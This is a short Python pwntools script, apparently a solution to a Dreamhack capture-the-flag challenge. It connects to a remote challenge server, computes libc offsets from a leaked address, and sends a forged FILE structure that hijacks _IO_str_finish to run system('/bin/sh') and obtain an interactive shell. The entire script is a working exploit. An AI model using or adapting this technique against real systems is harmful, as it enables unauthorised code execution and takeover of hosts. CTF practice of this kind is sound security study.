from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 18454
r = remote(HOST, PORT)

r.recvuntil(b'stdout: ')
libc=int(r.recvline().decode().strip(),16)-0x3ec760
binsh=libc+0x1b3e9a
system=libc+0x4f440
_IO_str_jumps=libc+0x3e8360
_IO_str_finish=_IO_str_jumps+0x10

payload=flat([
    0,
    0,0,0,0,0,0,
    binsh,
    0,0,0,0,0,0,0,0,0,
    0x6010a0+0x80,
    0,0,0,0,0,0,0,0,0,
    _IO_str_finish-0x10,
    0,
    system
])
r.sendafter(b'Data: ', payload)
r.interactive()